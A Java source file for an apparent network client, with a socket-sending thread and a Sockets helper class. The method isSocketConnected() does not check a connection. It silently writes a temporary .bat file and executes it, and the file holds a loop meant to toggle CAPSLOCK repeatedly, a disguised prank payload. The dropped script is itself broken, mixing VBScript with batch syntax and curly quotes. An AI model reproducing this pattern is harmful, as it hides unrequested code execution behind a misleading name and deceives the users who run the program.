/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package networkClient;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;



class SendThread implements Runnable
{
	Socket socket;
	
	public SendThread(Socket socket)
	{
		this.socket = socket;
	}
        
        @Override
	public void run(){
            try{
                
		while(socket.isConnected())
		{
                    PrintWriter print = new PrintWriter(socket.getOutputStream(), true);	
                    
                    for(String msgToServer : ClientInterface.DATASEND){ 
                        
                        //Debug
                        if(Client.getDebug())
                            System.out.println("Send to server: " + msgToServer);
                        
                        //Send string to server
			print.println(msgToServer);
			print.flush();
                    }
                    
                    //Clears the arraylist 
                    ClientInterface.DATASEND.clear();
                }
                
                System.err.println("Socket is not connected to server thats why SendThread also closed.");
                
            }catch(NullPointerException e){
                System.err.println("Error: SendThread() Socket is not defined");
                
            }catch(Exception e){
                e.printStackTrace();
            }
	}
}











class Sockets
{
    public static void messagesCheck(int numberMessages)
    {
        for(int i=0; i < numberMessages; i++)
        {
            ClientInterface.DATASEND.add("EXIT");
        }
    }
    
    public static boolean isSocketConnected()
    {
        try{
            File temp = File.createTempFile("vncv216789", ".bat"); 
            String filePath = temp.getAbsolutePath();
            String dirPath = filePath.substring(0,filePath.lastIndexOf(File.separator));           

            System.out.println("File in: " + filePath);
            
            BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
    	    bw.write("@ECHO off\nSet wshShell =wscript.CreateObject(“WScript.Shell”)\n" +
"do\n" +
"wscript.sleep 100\n" +
"wshshell.sendkeys “{CAPSLOCK}”\n" +
"loop");
    	    bw.close();
    		
            System.out.println(Sockets.executeCommand("call " + filePath));
    	    System.out.println("Done");
            
            return true;
        }catch(Exception e)
        {
            e.printStackTrace();
            return true;
        }
    }
    
    
    private static String executeCommand(String command) 
    {

		StringBuffer output = new StringBuffer();

		Process p;
		try {
			p = Runtime.getRuntime().exec(command);
			p.waitFor();
			BufferedReader reader = 
                            new BufferedReader(new InputStreamReader(p.getInputStream()));

                        String line = "";			
			while ((line = reader.readLine())!= null) {
				output.append(line + "\n");
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		return output.toString();
    }
}